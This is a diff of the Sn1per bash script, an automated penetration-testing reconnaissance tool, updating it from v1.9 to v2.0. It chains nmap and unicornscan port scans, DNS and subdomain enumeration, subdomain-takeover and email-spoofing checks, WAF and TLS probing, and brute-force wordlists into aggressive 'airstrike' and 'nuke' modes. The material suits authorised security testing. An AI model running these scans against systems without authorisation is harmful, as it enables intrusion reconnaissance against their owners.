@@ -1,5 +1,5 @@
 #!/bin/bash
-# + -- --=[Sn1per v1.9 by 1N3 
+# + -- --=[Sn1per v2.0 by 1N3 
 # + -- --=[http://crowdshield.com
 #
 # Sn1per - Automated Pentest Recon Tool
@@ -30,23 +30,21 @@
 # ./sniper <targets.txt> nuke <report>
 # ./sniper loot
 #
-# UNCOMMENT AND SET TARGET DIR FOR UNIVERSAL ACCESS (ie. sniper <target>)
-cd /usr/share/sniper/ 
-
-#clear
 
 TARGET="$1"
 MODE="$2"
 OPT1="$3"
-LOOT_DIR="loot"
-CMSMAP="CMSmap/cmsmap.py"
-SAMRDUMP="bin/samrdump.py"
-DNSDICT6="bin/dnsdict6"
-INURLBR="bin/inurlbr.php"
-USER_FILE="BruteX/wordlists/simple-users.txt"
-PASS_FILE="BruteX/wordlists/password.lst"
-DNS_FILE="BruteX/wordlists/namelist.txt"
-SUPER_MICRO_SCAN="SuperMicro-Password-Scanner/supermicro_scan.sh"
+INSTALL_DIR="/usr/share/sniper"
+LOOT_DIR="/usr/share/sniper/loot"
+PLUGINS_DIR="/usr/share/sniper/plugins"
+CMSMAP="/usr/share/sniper/plugins/CMSmap/cmsmap.py"
+SAMRDUMP="/usr/share/sniper/bin/samrdump.py"
+DNSDICT6="/usr/share/sniper/bin/dnsdict6"
+INURLBR="/usr/share/sniper/bin/inurlbr.php"
+USER_FILE="/usr/share/brutex/wordlists/simple-users.txt"
+PASS_FILE="/usr/share/brutex/wordlists/password.lst"
+DNS_FILE="/usr/share/brutex/wordlists/namelist.txt"
+SUPER_MICRO_SCAN="/usr/share/sniper/plugins/SuperMicro-Password-Scanner/supermicro_scan.sh"
 THREADS="30"
 OKBLUE='\033[94m'
 OKRED='\033[91m'
@@ -54,7 +52,8 @@ OKGREEN='\033[92m'
 OKORANGE='\033[93m'
 RESET='\e[0m'
 REGEX='^[0-9]+$'
-DIR=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )
+
+cd $INSTALL_DIR
 
 # ENABLE/DISABLE AUTOMATIC BRUTE FORCE
 # DEFAULT IS "1" (ENABLED)
@@ -69,11 +68,35 @@ if [ -z $TARGET ]; then
 	echo -e "$OKRED               /_/                 $RESET"
 	echo -e ""
 	echo -e "$OKORANGE + -- --=[http://crowdshield.com$RESET"
-	echo -e "$OKORANGE + -- --=[sn1per v1.9 by 1N3$RESET"
+	echo -e "$OKORANGE + -- --=[sn1per v2.0 by 1N3$RESET"
 	echo -e "$OKORANGE + -- --=[Usage: sn1per <target>$RESET"
 	echo ""
 	exit
 fi
+
+function loot {
+	echo -e "$OKRED                ____               $RESET"
+	echo -e "$OKRED    _________  /  _/___  ___  _____$RESET"
+	echo -e "$OKRED   / ___/ __ \ / // __ \/ _ \/ ___/$RESET"
+	echo -e "$OKRED  (__  ) / / // // /_/ /  __/ /    $RESET"
+	echo -e "$OKRED /____/_/ /_/___/ .___/\___/_/     $RESET"
+	echo -e "$OKRED               /_/                 $RESET"
+	echo ""
+	cd $LOOT_DIR
+	echo -e "$OKORANGE + -- --=[Sorting loot directory ($LOOT_DIR)"
+	echo -e "$OKORANGE + -- --=[Generating reports..."
+	for a in `ls sniper-*.txt 2>/dev/null`; 
+	do 
+		echo "$a" > $LOOT_DIR/reports/$a
+		sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g" $a >> $LOOT_DIR/reports/$a
+		mv $a $LOOT_DIR/output/
+	done
+	rm -f $LOOT_DIR/.fuse_* 2> /dev/null
+	echo -e "$OKORANGE + -- --=[Opening loot directory..."
+	iceweasel $LOOT_DIR &> /dev/null &
+	zenmap -f $LOOT_DIR/nmap/ &> /dev/null &
+	echo -e "$OKORANGE + -- --=[Done!"
+}
 
 if [[ ${TARGET:0:1} =~ $REGEX ]]; 
 	then 
@@ -85,37 +108,12 @@ fi
 #clear
 
 if [ "$MODE" = "report" ]; then
-	./sniper $TARGET | tee ./loot/sniper-$TARGET-`date +%Y%m%d%H%M`.txt 2>&1
+	sniper $TARGET | tee $LOOT_DIR/sniper-$TARGET-`date +%Y%m%d%H%M`.txt 2>&1
 	exit
 fi
 
 if [ "$TARGET" = "loot" ]; then
-	echo -e "$OKRED                ____               $RESET"
-	echo -e "$OKRED    _________  /  _/___  ___  _____$RESET"
-	echo -e "$OKRED   / ___/ __ \ / // __ \/ _ \/ ___/$RESET"
-	echo -e "$OKRED  (__  ) / / // // /_/ /  __/ /    $RESET"
-	echo -e "$OKRED /____/_/ /_/___/ .___/\___/_/     $RESET"
-	echo -e "$OKRED               /_/                 $RESET"
-	echo ""
-	cd $PWD/loot/
-	echo -e "$OKORANGE + -- --=[Sorting loot directory ($PWD)"
-	mkdir reports/ -p 2> /dev/null
-	echo -e "$OKORANGE + -- --=[Generating reports..."
-	for a in `ls sniper-*.txt 2>/dev/null`; do echo "$a" >> reports/$a && sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g" $a > reports/$a; done
-	mv $PWD/report-* $PWD/reports/ 2> /dev/null
-	mkdir $PWD/screenshots/ -p 2> /dev/null
-	mv $PWD/*.jpg $PWD/screenshots/ 2> /dev/null
-	mkdir $PWD/nmap -p 2> /dev/null
-	mv $PWD/*.xml $PWD/nmap/ 2> /dev/null
-	mkdir $PWD/domains -p 2> /dev/null
-	mv $PWD/domains-* $PWD/domains/ 2> /dev/null
-	mkdir $PWD/output -p 2> /dev/null
-	mv $PWD/sniper-* $PWD/output 2> /dev/null
-	rm -f $PWD/.fuse_* 2> /dev/null
-	echo -e "$OKORANGE + -- --=[Opening loot directory..."
-	iceweasel $PWD &> /dev/null &
-	zenmap -f $PWD/nmap/ &> /dev/null &
-	echo -e "$OKORANGE + -- --=[Done!"
+	loot
 	exit
 fi
 
@@ -140,18 +138,18 @@ if [ "$MODE" = "discover" ]; then
 	echo -e "$OKGREEN + -- ----------------------------=[Checking ARP Cache]=---------------------- -- +$RESET"
 	arp -a -n
 	echo -e "$OKGREEN + -- ----------------------------=[Running Port Discovery Scan]=------------- -- +$RESET"
-	unicornscan $TARGET -p 21,22,23,25,53,79,80,110,111,135,139,162,389,443,445,512,513,514,1099,1433,1524,2049,2121,3306,3310,3389,3632,5432,5800,5900,6667,8000,8009,8080,8180,8443,8888,10000,49152 2>/dev/null | awk '{print $6}' | sort -u > $PWD/loot/sniper-ips.txt
+	unicornscan $TARGET -p 21,22,23,25,53,79,80,110,111,135,139,162,389,443,445,512,513,514,1099,1433,1524,2049,2121,3306,3310,3389,3632,5432,5800,5900,6667,8000,8009,8080,8180,8443,8888,10000,49152,U:53,U:67,U:68,U:88,U:161,U:162,U:137,U:138,U:139,U:389,U:520,U:2049 2>/dev/null | awk '{print $6}' | sort -u > $LOOT_DIR/domains/sniper-ips.txt
 	echo -e "$OKGREEN + -- ----------------------------=[Current Targets]=------------------------- -- +$RESET"
-	cat $PWD/loot/sniper-ips.txt
+	cat $LOOT_DIR/domains/sniper-ips.txt
 	echo -e "$OKGREEN + -- ----------------------------=[Launching Sn1per Scans]=------------------ -- +$RESET"
 	echo ""
 	if [ "$OPT1" = "report" ]; then
-		for a in `cat $PWD/loot/sniper-ips.txt` 
+		for a in `cat $LOOT_DIR/domains/sniper-ips.txt` 
 			do sniper $a stealth report
 		done
 		exit
 	fi	
-	for a in `cat $PWD/loot/sniper-ips.txt` 
+	for a in `cat $LOOT_DIR/domains/sniper-ips.txt` 
 		do sniper $a stealth 
 	done
 	exit
@@ -159,29 +157,15 @@ fi
 
 if [ "$MODE" = "web" ]; then
 	if [ "$OPT1" = "report" ]; then
-		./sniper $TARGET $MODE | tee ./loot/sniper-$TARGET-$MODE-`date +%Y%m%d%H%M`.txt 2>&1
-		cd $PWD/loot/
-		echo -e "$OKORANGE + -- --=[Sorting loot directory ($PWD)"
-		mkdir reports/ -p 2> /dev/null
-		echo -e "$OKORANGE + -- --=[Generating reports..."
-		for a in `ls sniper-*.txt 2>/dev/null`; do echo "$a" >> reports/$a && sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g" $a > reports/$a; done
-		mv $PWD/report-* $PWD/reports/ 2> /dev/null
-		mkdir $PWD/screenshots/ -p 2> /dev/null
-		mv $PWD/*.jpg $PWD/screenshots/ 2> /dev/null
-		mkdir $PWD/nmap -p 2> /dev/null
-		mv $PWD/*.xml $PWD/nmap/ 2> /dev/null
-		mkdir $PWD/domains -p 2> /dev/null
-		mv $PWD/domains-* $PWD/domains/ 2> /dev/null
-		mkdir $PWD/output -p 2> /dev/null
-		mv $PWD/sniper-* $PWD/output 2> /dev/null
-		rm -f $PWD/.fuse_* 2> /dev/null
+		sniper $TARGET $MODE | tee $LOOT_DIR/sniper-$TARGET-$MODE-`date +%Y%m%d%H%M`.txt 2>&1
+		loot
 		exit
 	fi
 fi
 
 if [ "$MODE" = "stealth" ]; then
 	if [ "$OPT1" = "report" ]; then
-		./sniper $TARGET $MODE | tee ./loot/sniper-$TARGET-$MODE-`date +%Y%m%d%H%M`.txt 2>&1 
+		sniper $TARGET $MODE | tee $LOOT_DIR/sniper-$TARGET-$MODE-`date +%Y%m%d%H%M`.txt 2>&1 
 		exit
 	fi
 	echo -e "$OKRED                ____               $RESET"
@@ -192,7 +176,7 @@ if [ "$MODE" = "stealth" ]; then
 	echo -e "$OKRED               /_/                 $RESET"
 	echo -e "$RESET"
 	echo -e "$OKORANGE + -- --=[http://crowdshield.com"
-	echo -e "$OKORANGE + -- --=[sn1per v1.9 by 1N3"
+	echo -e "$OKORANGE + -- --=[sn1per v2.0 by 1N3"
 	echo -e "$OKRED " 	
 	echo -e "$OKRED     ./\."
 	echo -e "$OKRED   ./    '\."
@@ -236,59 +220,67 @@ if [ "$MODE" = "stealth" ]; then
 		echo -e "$OKGREEN + -- ----------------------------=[Gathering DNS Info]=---------------------- -- +$RESET"
 		dig -x $TARGET
 		dnsenum $TARGET
-		mv -f *_ips.txt loot/ 2>/dev/null
+		mv -f *_ips.txt $LOOT_DIR/ 2>/dev/null
 		echo -e "$OKGREEN + -- ----------------------------=[Gathering DNS Subdomains]=---------------- -- +$RESET"
-		python Sublist3r/sublist3r.py -d $TARGET -vvv -o loot/domains/domains-$TARGET.txt 2>/dev/null
-		dos2unix loot/domains/domains-$TARGET.txt 2>/dev/null
+		python Sublist3r/sublist3r.py -d $TARGET -vvv -o $LOOT_DIR/domains/domains-$TARGET.txt 2>/dev/null
+		dos2unix $LOOT_DIR/domains/domains-$TARGET.txt 2>/dev/null
 		echo -e "$OKGREEN + -- ----------------------------=[Checking for Sub-Domain Hijacking]=------- -- +$RESET"
-		for a in `cat loot/domains/domains-$TARGET.txt`; do dig $a CNAME | egrep -i "heroku|github|bitbucket|squarespace|shopify|desk|teamwork|unbounce|helpjuice|helpscout|pingdom|tictail|campaign monitor|cargocollective|statuspage|tumblr|amazonaws|hubspot" 2>/dev/null; done;
+		for a in `cat $LOOT_DIR/domains/domains-$TARGET.txt 2> /dev/null`; do dig $a CNAME | egrep -i "wordpress|instapage|heroku|github|bitbucket|squarespace|shopify|desk|teamwork|unbounce|helpjuice|helpscout|pingdom|tictail|campaign monitor|cargocollective|statuspage|tumblr|amazonaws|hubspot" 2>/dev/null; done;
 		echo -e "$OKGREEN + -- ----------------------------=[Checking Email Security]=----------------- -- +$RESET"
 		python SimpleEmailSpoofer/spoofcheck.py $TARGET 2>/dev/null
 	fi
 	echo ""
 	echo -e "$OKGREEN + -- ----------------------------=[Running TCP port scan]=------------------- -- +$RESET"
-	nmap -sS -T5 --open -p 21,22,23,25,53,79,80,110,111,135,139,162,389,443,445,512,513,514,1099,1433,1524,2049,2121,3306,3310,3389,3632,5432,5800,5900,6667,8000,8009,8080,8180,8443,8888,10000,49152 $TARGET -oX $LOOT_DIR/nmap-$TARGET.xml
+	nmap -sS -T5 --open -p 21,22,23,25,53,79,80,110,111,135,139,162,389,443,445,512,513,514,1099,1433,1524,2049,2121,3306,3310,3389,3632,5432,5800,5900,6667,8000,8009,8080,8180,8443,8888,10000,49152,U:53,U:67,U:68,U:88,U:161,U:162,U:137,U:138,U:139,U:389,U:520,U:2049 $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml
 	echo -e "$OKGREEN + -- ----------------------------=[Running UDP port scan]=------------------- -- +$RESET"
 	nmap -sU -T5 --open -p U:53,U:67,U:68,U:88,U:161,U:162,U:137,U:138,U:139,U:389,U:520,U:2049 $TARGET
-	echo -e "$OKGREEN + -- ----------------------------=[Checking for WAF]=------------------------ -- +$RESET"
-	wafw00f http://$TARGET
-	wafw00f https://$TARGET
-	echo -e "$OKGREEN + -- ----------------------------=[Gathering HTTP Info]=--------------------- -- +$RESET"
-	whatweb http://$TARGET
-	whatweb https://$TARGET
-	xsstracer $TARGET 80
-	xsstracer $TARGET 443
-	echo -e "$OKGREEN + -- ----------------------------=[Gathering SSL/TLS Info]=------------------ -- +$RESET"
-	sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers $TARGET
-	sslscan --no-failed $TARGET
-	# testssl $TARGET
-	echo -e "$OKGREEN + -- ----------------------------=[Saving Web Screenshots]=------------------ -- +$RESET"
-	cutycapt --url=http://$TARGET --out=loot/$TARGET-port80.jpg
-	echo -e "$OKRED[+]$RESET Screenshot saved to $PWD/loot/$TARGET-port80.jpg"
-	cutycapt --url=https://$TARGET --out=loot/$TARGET-port443.jpg
-	echo -e "$OKRED[+]$RESET Screenshot saved to $PWD/loot/$TARGET-port443.jpg"
+	
+	port_80=`grep 'portid="80"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+	port_443=`grep 'portid="443"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+	
+	if [ -z "$port_80" ];
+	then
+		echo -e "$OKRED + -- --=[Port 80 closed... skipping.$RESET"
+	else
+		echo -e "$OKORANGE + -- --=[Port 80 opened... running tests...$RESET"
+		echo -e "$OKGREEN + -- ----------------------------=[Checking for WAF]=------------------------ -- +$RESET"
+		wafw00f http://$TARGET
+		echo -e "$OKGREEN + -- ----------------------------=[Gathering HTTP Info]=--------------------- -- +$RESET"
+		whatweb http://$TARGET
+		echo -e "$OKGREEN + -- ----------------------------=[Checking Headers and Methods]=------------ -- +$RESET"
+		xsstracer $TARGET 80
+		echo -e "$OKGREEN + -- ----------------------------=[Saving Web Screenshots]=------------------ -- +$RESET"
+		cutycapt --url=http://$TARGET --out=$LOOT_DIR/screenshots/$TARGET-port80.jpg
+	fi
+	
+	if [ -z "$port_443" ];
+	then
+		echo -e "$OKRED + -- --=[Port 443 closed... skipping.$RESET"
+	else
+		echo -e "$OKORANGE + -- --=[Port 443 opened... running tests...$RESET"
+		echo -e "$OKGREEN + -- ----------------------------=[Checking for WAF]=------------------------ -- +$RESET"
+		wafw00f https://$TARGET 
+		echo -e "$OKGREEN + -- ----------------------------=[Gathering HTTP Info]=--------------------- -- +$RESET"
+		whatweb https://$TARGET
+		echo -e "$OKGREEN + -- ----------------------------=[Checking Headers and Methods]=------------ -- +$RESET"
+		xsstracer $TARGET 443
+		echo -e "$OKGREEN + -- ----------------------------=[Gathering SSL/TLS Info]=------------------ -- +$RESET"
+		sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers $TARGET
+		sslscan --no-failed $TARGET
+		echo -e "$OKGREEN + -- ----------------------------=[Saving Web Screenshots]=------------------ -- +$RESET"
+		cutycapt --url=https://$TARGET --out=$LOOT_DIR/screenshots/$TARGET-port443.jpg
+		echo -e "$OKRED[+]$RESET Screenshot saved to $LOOT_DIR/$a-port443.jpg"
+	fi
+	
 	echo -e "$OKGREEN + -- ----------------------------=[Done]=------------------------------------ -- +$RESET"
-	cd $PWD/loot/
-	echo -e "$OKORANGE + -- --=[Sorting loot directory ($PWD)"
-	mkdir reports/ -p 2> /dev/null
-	echo -e "$OKORANGE + -- --=[Generating reports..."
-	for a in `ls sniper-*.txt 2>/dev/null`; do echo "$a" >> reports/$a && sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g" $a > reports/$a; done
-	mv $PWD/report-* $PWD/reports/ 2> /dev/null
-	mkdir $PWD/screenshots/ -p 2> /dev/null
-	mv $PWD/*.jpg $PWD/screenshots/ 2> /dev/null
-	mkdir $PWD/nmap -p 2> /dev/null
-	mv $PWD/*.xml $PWD/nmap/ 2> /dev/null
-	mkdir $PWD/domains -p 2> /dev/null
-	mv $PWD/domains-* $PWD/domains/ 2> /dev/null
-	mkdir $PWD/output -p 2> /dev/null
-	mv $PWD/sniper-* $PWD/output 2> /dev/null
-	rm -f $PWD/.fuse_* 2> /dev/null
+	loot
+	rm -f $INSTALL_DIR/.fuse_* 2> /dev/null
 	exit
 fi
 
 if [ "$MODE" = "airstrike" ]; then
 	if [ "$OPT1" = "report" ]; then
-		./sniper $TARGET $MODE | tee ./loot/sniper-$MODE-`date +%Y%m%d%H%M`.txt 2>&1
+		sniper $TARGET $MODE | tee $LOOT_DIR/sniper-$MODE-`date +%Y%m%d%H%M`.txt 2>&1
 		exit
 	fi
 	echo -e "$OKRED                ____               $RESET"
@@ -299,7 +291,7 @@ if [ "$MODE" = "airstrike" ]; then
 	echo -e "$OKRED               /_/                 $RESET"
 	echo -e "$RESET"
 	echo -e "$OKORANGE + -- --=[http://crowdshield.com"
-	echo -e "$OKORANGE + -- --=[sn1per v1.9 by 1N3"
+	echo -e "$OKORANGE + -- --=[sn1per v2.0 by 1N3"
 
 	for a in `cat $TARGET`;
 	do
@@ -348,53 +340,58 @@ if [ "$MODE" = "airstrike" ]; then
 			echo -e "$OKGREEN + -- ----------------------------=[Gathering DNS Info]=---------------------- -- +$RESET"
 			dig -x $a
 			dnsenum $a
-			mv -f *_ips.txt loot/ 2>/dev/null
+			mv -f *_ips.txt $LOOT_DIR/domains/ 2>/dev/null
 			echo -e "$OKGREEN + -- ----------------------------=[Gathering DNS Subdomains]=---------------- -- +$RESET"
-			python Sublist3r/sublist3r.py -d $a -vvv -o loot/domains/domains-$a.txt 2>/dev/null
-			dos2unix loot/domains/domains-$a.txt 2>/dev/null
+			python Sublist3r/sublist3r.py -d $a -vvv -o $LOOT_DIR/domains/domains-$a.txt 2>/dev/null
+			dos2unix $LOOT_DIR/domains/domains-$a.txt 2>/dev/null
 			echo -e "$OKGREEN + -- ----------------------------=[Checking for Sub-Domain Hijacking]=------- -- +$RESET"
-			for b in `cat loot/domains/domains-$a.txt`; do dig $b CNAME | egrep -i 'heroku|github|bitbucket|squarespace|shopify|desk|teamwork|unbounce|helpjuice|helpscout|pingdom|tictail|campaign monitor|cargocollective|statuspage|tumblr|amazonaws|hubspot' 2>/dev/null; done;
+			for b in `cat $LOOT_DIR/domains/domains-$a.txt 2> /dev/null`; do dig $b CNAME | egrep -i 'wordpress|instapage|heroku|github|bitbucket|squarespace|shopify|desk|teamwork|unbounce|helpjuice|helpscout|pingdom|tictail|campaign monitor|cargocollective|statuspage|tumblr|amazonaws|hubspot' 2>/dev/null; done;
 			echo -e "$OKGREEN + -- ----------------------------=[Checking Email Security]=----------------- -- +$RESET"
 			python SimpleEmailSpoofer/spoofcheck.py $a 2>/dev/null
 		fi
 		echo ""
-		echo -e "$OKGREEN + -- ----------------------------=[Running TCP port scan]=------------------- -- +$RESET"
-		nmap -sS -T5 --open -p 21,22,23,25,53,79,80,110,111,135,139,162,389,443,445,512,513,514,1099,1433,1524,2049,2121,3306,3310,3389,3632,5432,5800,5900,6667,8000,8009,8080,8180,8443,8888,10000,49152 $a -oX $LOOT_DIR/nmap-$a.xml
-		echo -e "$OKGREEN + -- ----------------------------=[Running UDP port scan]=------------------- -- +$RESET"
-		nmap -sU -T5 --open -p U:53,U:67,U:68,U:88,U:161,U:162,U:137,U:138,U:139,U:389,U:520,U:2049 $a
-		echo -e "$OKGREEN + -- ----------------------------=[Checking for WAF]=------------------------ -- +$RESET"
-		wafw00f http://$a
-		wafw00f https://$a
-		echo -e "$OKGREEN + -- ----------------------------=[Gathering HTTP Info]=--------------------- -- +$RESET"
-		whatweb http://$a
-		whatweb https://$a
-		xsstracer $a 80
-		xsstracer $a 443
-		echo -e "$OKGREEN + -- ----------------------------=[Gathering SSL/TLS Info]=------------------ -- +$RESET"
-		sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers $a
-		sslscan --no-failed $a
-		# testssl $a
-		echo -e "$OKGREEN + -- ----------------------------=[Saving Web Screenshots]=------------------ -- +$RESET"
-		cutycapt --url=http://$a --out=loot/$a-port80.jpg
-		echo -e "$OKRED[+]$RESET Screenshot saved to $PWD/loot/$a-port80.jpg"
-		cutycapt --url=https://$a --out=loot/$a-port443.jpg
-		echo -e "$OKRED[+]$RESET Screenshot saved to $PWD/loot/$a-port443.jpg"
+		echo -e "$OKGREEN + -- ----------------------------=[Running port scan]=------------------- -- +$RESET"
+		nmap -sS -T5 --open -p 21,22,23,25,53,79,80,110,111,135,139,162,389,443,445,512,513,514,1099,1433,1524,2049,2121,3306,3310,3389,3632,5432,5800,5900,6667,8000,8009,8080,8180,8443,8888,10000,49152,U:53,U:67,U:68,U:88,U:161,U:162,U:137,U:138,U:139,U:389,U:520,U:2049 $a -oX $LOOT_DIR/nmap/nmap-$a.xml
+		
+		port_80=`grep 'portid="80"' $LOOT_DIR/nmap/nmap-$a.xml | grep open`
+		port_443=`grep 'portid="443"' $LOOT_DIR/nmap/nmap-$a.xml | grep open`
+		
+		if [ -z "$port_80" ];
+		then
+			echo -e "$OKRED + -- --=[Port 80 closed... skipping.$RESET"
+		else
+			echo -e "$OKORANGE + -- --=[Port 80 opened... running tests...$RESET"
+			echo -e "$OKGREEN + -- ----------------------------=[Checking for WAF]=------------------------ -- +$RESET"
+			wafw00f http://$a 
+			echo -e "$OKGREEN + -- ----------------------------=[Gathering HTTP Info]=--------------------- -- +$RESET"
+			whatweb http://$a
+			echo -e "$OKGREEN + -- ----------------------------=[Checking Headers and Methods]=------------ -- +$RESET"
+			xsstracer $a 80
+			echo -e "$OKGREEN + -- ----------------------------=[Saving Web Screenshots]=------------------ -- +$RESET"
+			cutycapt --url=http://$a --out=$LOOT_DIR/screenshots/$a-port80.jpg
+		fi
+		
+		if [ -z "$port_443" ];
+		then
+			echo -e "$OKRED + -- --=[Port 443 closed... skipping.$RESET"
+		else
+			echo -e "$OKORANGE + -- --=[Port 443 opened... running tests...$RESET"
+			echo -e "$OKGREEN + -- ----------------------------=[Checking for WAF]=------------------------ -- +$RESET"
+			wafw00f https://$a 
+			echo -e "$OKGREEN + -- ----------------------------=[Gathering HTTP Info]=--------------------- -- +$RESET"
+			whatweb https://$a
+			echo -e "$OKGREEN + -- ----------------------------=[Checking Headers and Methods]=------------ -- +$RESET"
+			xsstracer $a 443
+			echo -e "$OKGREEN + -- ----------------------------=[Gathering SSL/TLS Info]=------------------ -- +$RESET"
+			sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers $a
+			sslscan --no-failed $a
+			echo -e "$OKGREEN + -- ----------------------------=[Saving Web Screenshots]=------------------ -- +$RESET"
+			cutycapt --url=https://$a --out=$LOOT_DIR/screenshots/$a-port443.jpg
+			echo -e "$OKRED[+]$RESET Screenshot saved to $LOOT_DIR/screenshots/$a-port443.jpg"
+		fi
+		
 		echo -e "$OKGREEN + -- ----------------------------=[Done!]=----------------------------------- -- +$RESET"
-		cd $PWD/loot/
-		echo -e "$OKORANGE + -- --=[Sorting loot directory ($PWD)"
-		mkdir reports/ -p 2> /dev/null
-		echo -e "$OKORANGE + -- --=[Generating reports..."
-		for a in `ls sniper-*.txt 2>/dev/null`; do echo "$a" >> reports/$a && sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g" $a > reports/$a; done
-		mv $PWD/report-* $PWD/reports/ 2> /dev/null
-		mkdir $PWD/screenshots/ -p 2> /dev/null
-		mv $PWD/*.jpg $PWD/screenshots/ 2> /dev/null
-		mkdir $PWD/nmap -p 2> /dev/null
-		mv $PWD/*.xml $PWD/nmap/ 2> /dev/null
-		mkdir $PWD/domains -p 2> /dev/null
-		mv $PWD/domains-* $PWD/domains/ 2> /dev/null
-		mkdir $PWD/output -p 2> /dev/null
-		mv $PWD/sniper-* $PWD/output 2> /dev/null
-		rm -f $PWD/.fuse_* 2> /dev/null
+		loot
 		echo -e ""
 		echo -e ""
 		echo -e ""
@@ -423,7 +420,7 @@ fi
 
 if [ "$MODE" = "nuke" ]; then
 	if [ "$OPT1" = "report" ]; then
-		./sniper $TARGET $MODE | tee ./loot/sniper-$TARGET-$MODE-`date +%Y%m%d%H%M`.txt 2>&1
+		sniper $TARGET $MODE | tee $LOOT_DIR/sniper-$TARGET-$MODE-`date +%Y%m%d%H%M`.txt 2>&1
 		exit
 	fi
 	for a in `cat $TARGET`; do
@@ -442,7 +439,7 @@ if [ "$MODE" = "nuke" ]; then
 		echo -e "$OKRED                        (\` ^''\`-' ')"
 		echo -e "$OKRED --------------------------------------------------------- $RESET"
 		echo -e "$OKORANGE + -- --=[WARNING! Nuking ALL target! $RESET"
-		./sniper $a
+		sniper $a
 		echo -e ""
 		echo -e ""
 		echo -e ""
@@ -470,7 +467,7 @@ echo -e "$OKRED /____/_/ /_/___/ .___/\___/_/     $RESET"
 echo -e "$OKRED               /_/                 $RESET"
 echo -e "$RESET"
 echo -e "$OKORANGE + -- --=[http://crowdshield.com"
-echo -e "$OKORANGE + -- --=[sn1per v1.9 by 1N3"
+echo -e "$OKORANGE + -- --=[sn1per v2.0 by 1N3"
 echo -e "$RESET"
 echo -e "$OKGREEN + -- ----------------------------=[Running Nslookup]=------------------------ -- +$RESET"
 nslookup $TARGET
@@ -486,12 +483,12 @@ then
 	echo -e "$OKGREEN + -- ----------------------------=[Gathering DNS Info]=---------------------- -- +$RESET"
 	dig -x $TARGET
 	dnsenum $TARGET
-	mv -f *_ips.txt loot/ 2>/dev/null
+	mv -f *_ips.txt $LOOT_DIR/ 2>/dev/null
 	echo -e "$OKGREEN + -- ----------------------------=[Gathering DNS Subdomains]=---------------- -- +$RESET"
-	python Sublist3r/sublist3r.py -d $TARGET -vvv -o loot/domains/domains-$TARGET.txt 2>/dev/null
-	dos2unix loot/domains/domains-$TARGET.txt 2>/dev/null
+	python Sublist3r/sublist3r.py -d $TARGET -vvv -o $LOOT_DIR/domains/domains-$TARGET.txt 2>/dev/null
+	dos2unix $LOOT_DIR/domains/domains-$TARGET.txt 2>/dev/null
 	echo -e "$OKGREEN + -- ----------------------------=[Checking for Sub-Domain Hijacking]=------- -- +$RESET"
-	for a in `cat loot/domains/domains-$TARGET.txt`; do dig $a CNAME | egrep -i 'heroku|github|bitbucket|squarespace|shopify|desk|teamwork|unbounce|helpjuice|helpscout|pingdom|tictail|campaign monitor|cargocollective|statuspage|tumblr|amazonaws|hubspot' 2>/dev/null; done;
+	for a in `cat $LOOT_DIR/domains/domains-$TARGET.txt 2> /dev/null`; do dig $a CNAME | egrep -i 'wordpress|instapage|heroku|github|bitbucket|squarespace|shopify|desk|teamwork|unbounce|helpjuice|helpscout|pingdom|tictail|campaign monitor|cargocollective|statuspage|tumblr|amazonaws|hubspot' 2>/dev/null; done;
 	echo -e "$OKGREEN + -- ----------------------------=[Checking Email Security]=----------------- -- +$RESET"
 	python SimpleEmailSpoofer/spoofcheck.py $TARGET 2>/dev/null
 fi
@@ -501,13 +498,13 @@ ping -c 1 $TARGET
 echo ""
 echo -e "$OKGREEN + -- ----------------------------=[Running TCP port scan]=------------------- -- +$RESET"
 if [ -z "$OPT1" ]; then
-	nmap -sS -T5 --open -p 21,22,23,25,53,79,80,110,111,135,139,162,389,443,445,512,513,514,1099,1433,1524,2049,2121,3306,3310,3389,3632,5432,5800,5900,6667,8000,8009,8080,8180,8443,8888,10000,49152 $TARGET -oX $LOOT_DIR/nmap-$TARGET.xml
+	nmap -sS -T5 --open -p 21,22,23,25,53,79,80,110,111,135,139,162,389,443,445,512,513,514,1099,1433,1524,2049,2121,3306,3310,3389,3632,5432,5800,5900,6667,8000,8009,8080,8180,8443,8888,10000,49152,U:53,U:67,U:68,U:88,U:161,U:162,U:137,U:138,U:139,U:389,U:520,U:2049 $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml
 	echo -e "$OKGREEN + -- ----------------------------=[Running UDP port scan]=------------------- -- +$RESET"
 	nmap -sU -T5 --open -p U:53,U:67,U:68,U:88,U:161,U:162,U:137,U:138,U:139,U:389,U:520,U:2049 $TARGET
 elif [ "$OPT1" == "web" ]; then
-	nmap -sV -T5 -p 80,443 --open $TARGET -oX $LOOT_DIR/nmap-$TARGET.xml
+	nmap -sV -T5 -p 80,443 --open $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml
 else
-	nmap -sS -T5 -p $OPT1 --open $TARGET -oX $LOOT_DIR/nmap-$TARGET.xml
+	nmap -sS -T5 -p $OPT1 --open $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml
 	echo -e "$OKGREEN + -- ----------------------------=[Running UDP port scan]=------------------- -- +$RESET"
 	nmap -sU -T5 -p U:$OPT1 --open $TARGET
 fi
@@ -516,47 +513,47 @@ service postgresql start
 
 echo ""
 echo -e "$OKGREEN + -- ----------------------------=[Running Intrusive Scans]=----------------- -- +$RESET"
-port_21=`grep 'portid="21"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_22=`grep 'portid="22"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_23=`grep 'portid="23"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_25=`grep 'portid="25"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
